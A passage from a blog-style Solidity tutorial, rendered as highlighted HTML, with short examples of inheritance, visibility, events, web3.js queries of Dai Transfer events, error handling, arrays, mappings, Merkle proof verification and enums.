contracts are called is determined by the inheritance.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">event</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    name <span class=\"token operator\">=</span> _name<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Greeting</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">event</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> text<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _text<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        text <span class=\"token operator\">=</span> _text<span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>_text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld3</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span> Greeting <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HelloWorld contract called\"</span><span class=\"token punctuation\">)</span> <span class=\"token function\">Greeting</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greetings contract called\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld5</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span> Greeting <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">Greeting</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greetings contract called\"</span><span class=\"token punctuation\">)</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"HelloWorld contract called\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>You can override an inherited state variable in a constructor and not by re-assigning it outside the constructor.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n\n<span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name <span class=\"token operator\">=</span> <span class=\"token string\">\"Davis\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Greeting</span> <span class=\"token keyword\">is</span> HelloWorld <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        name <span class=\"token operator\">=</span> <span class=\"token string\">\"Bwake\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><strong>Private</strong> state variables and functions are only accessible to the contract that defines it.\n<strong>Internal</strong> state variables and functions are  accessible to the contract that defines it and the child contract.\n<strong>External</strong> state variables and functions are  accessible to the other contracts and accounts.\n<strong>External</strong> state variables and functions are  accessible to any contracts and accounts.</p>\n<h3>Events</h3>\n<p>contracts can tell us that something has happened in the blockchain by firing events.\nApplications can be notified when this events are fired.\nEvents accept 3 parameters.\nWe can get access to the past events and subscribe to new ones.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n\n<span class=\"token comment\">//indexed allows you to search for events where the parameter equals to a certain value</span>\n<span class=\"token keyword\">event</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">event</span> <span class=\"token function\">AnotherLog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">fireEvents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello Again\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">AnotherLog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Interacting with past events from Dai stable coin</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> Web3 <span class=\"token operator\">=</span>  <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"web3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//DAI stablecoin ABI</span>\n<span class=\"token keyword\">const</span> abi <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./abi.json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">INFURA_URL</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Infura URL\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> web3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Web3</span><span class=\"token punctuation\">(</span><span class=\"token constant\">INFURA_URL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//Address of Dai Stablecoin</span>\n<span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> <span class=\"token string\">\"0x89d24A6b4...\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">const</span> latest <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getBlockNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Latest block is\"</span><span class=\"token punctuation\">,</span> latest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> contract <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>Contract</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> logs <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">getPastEvents</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Transfer\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>fromBlock<span class=\"token operator\">:</span> latest <span class=\"token operator\">-</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span>\ntoBlock<span class=\"token operator\">:</span> latest\n<span class=\"token comment\">//filter by sender</span>\n<span class=\"token comment\">//filter: {src: \"0x526a..\"},</span>\n<span class=\"token comment\">//filter by receiver</span>\n<span class=\"token comment\">///filter: {dst: \"0x397553...\"}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Logs\"</span><span class=\"token punctuation\">,</span> logs<span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>logs<span class=\"token punctuation\">.</span>length logs<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Subscribe to new events.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> Web3 <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"web3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//Dai StableCoin ABI</span>\n<span class=\"token keyword\">const</span> abi <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./abi.json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">INFURA_URL</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"infura url\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> web3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Web3</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Web3<span class=\"token punctuation\">.</span>providers<span class=\"token punctuation\">.</span>WebsocketProvider</span><span class=\"token punctuation\">(</span><span class=\"token constant\">INFURA_URL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//Address for Dai stablecoin</span>\n<span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> <span class=\"token string\">\"0x89d24...\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> contract <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>Contract</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Subscribe to transfer event\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    contract<span class=\"token punctuation\">.</span>events<span class=\"token punctuation\">.</span><span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//filter by sender</span>\n        filter<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>src<span class=\"token operator\">:</span> <span class=\"token string\">\"0x397553...\"</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">(</span><span class=\"token parameter\">error<span class=\"token punctuation\">,</span> log</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span> error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"log\"</span><span class=\"token punctuation\">,</span> log<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Error handling</h3>\n<h4>Assert</h4>\n<p>Should never evaluate to false.\nUses up all the gas.</p>\n<h4>Require</h4>\n<p>Used in validating input,preconditions and outputs.\nDoesn’t use up all the gas.</p>\n<h4>Revert</h4>\n<p>Used when checking more complex conditions.\ntakes in one argument</p>\n<h3>Loops</h3>\n<p>Doing <code class=\"language-text\">for</code> loops in JavaScript.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">pragma solidity <span class=\"token operator\">^</span><span class=\"token number\">0.5</span><span class=\"token number\">.3</span><span class=\"token punctuation\">;</span>\n\ncontract HelloWorld<span class=\"token punctuation\">{</span>\n\nuint <span class=\"token keyword\">public</span> count<span class=\"token punctuation\">;</span>\naddress<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> shareholders<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">loop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uint n</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>uint i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">dividendPay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>uint i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> shareholders<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//send Ether to each shareholder</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Arrays</h3>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">pragma solidity <span class=\"token operator\">^</span><span class=\"token number\">0.5</span><span class=\"token number\">.3</span><span class=\"token punctuation\">;</span>\n\ncontract HelloWorld<span class=\"token punctuation\">{</span>\n\nuint<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> myArray<span class=\"token punctuation\">;</span>\nuint<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> myArray2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nuint<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> newFixedArray<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uint i</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    myArray<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uint i</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    myArray<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getLength</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> view <span class=\"token function\">returns</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> myArray<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">uint index</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token comment\">// delete myArray[index];</span>\n    myArray<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> myArray<span class=\"token punctuation\">[</span>myArray<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    \n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Mappings</h3>\n<p>Are like maps in JavaScript.\nAre good for easy and faster access of data.\nYou cannot iterate or get the size of a mapping.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\">pragma solidity <span class=\"token operator\">^</span><span class=\"token number\">0.5</span><span class=\"token number\">.3</span><span class=\"token punctuation\">;</span>\n\ncontract HelloWorld<span class=\"token punctuation\">{</span>\n\n<span class=\"token function\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">address</span> <span class=\"token operator\">=></span> uint<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> myMap<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">address _addr</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> view <span class=\"token function\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> myMap<span class=\"token punctuation\">[</span>_addr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">address _addr<span class=\"token punctuation\">,</span> uint _i</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    myMap<span class=\"token punctuation\">[</span>_addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _i<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">address _addr</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">delete</span> myMap<span class=\"token punctuation\">[</span>_addr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Merkle Tree</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">verifyMerkleProof</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> proof<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> root<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> leaf<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">bytes32</span> hash <span class=\"token operator\">=</span> leaf<span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">//recompute merkle root</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> proof<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>index <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                hash <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">,</span> proof<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                hash <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            \n            index <span class=\"token operator\">=</span> index <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token keyword\">return</span> hash <span class=\"token operator\">==</span> root<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Enum</h3>\n<p>is an enumerated list that allow us to set list of things in a contract</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Order</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">enum</span> <span class=\"token class-name\">Status</span> <span class=\"token punctuation\">{</span>\n        Pending<span class=\"token punctuation\">,</span>\n        Shipped<span class=\"token punctuation\">,</span> \n        Accepted<span class=\"token punctuation\">,</span>\n        Rejected<span class=\"token punctuation\">,</span>\n        Cancelled\n    <span class=\"token punctuation\">}</span>\n    \n    Status <span class=\"token keyword\">public</span> status<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">ship</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>status <span class=\"token operator\">==</span> Status<span class=\"token punctuation\">.</span>Pending<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        status <span class=\"token operator\">=</span> Status<span class=\"token punctuation\">.</span>Shipped<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">acceptDelivery</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>status <span class=\"token operator\">==</span> Status<span class=\"token punctuation\">.</span>Shipped<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        status <span class=\"token operator\">=</span> Status<span class=\"token punctuation\">.</span>Accepted<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">rejectDelivery</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>status <span class=\"token operator\">==</span> Status<span class=\"token punctuation\">.</span>Shipped<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        status <span class=\"token operator\">=</span> Status<span class=\"token punctuation\">.</span>Rejected<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>status <span class=\"token operator\">==</span> Status<span class=\"token punctuation\">.</span>Pending<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        status <span class=\"token operator\">=</span> Status<span class=\"token punctuation\">.</span>Cancelled<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Structs</h3>\n<p>Are user defined data types in solidity</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token 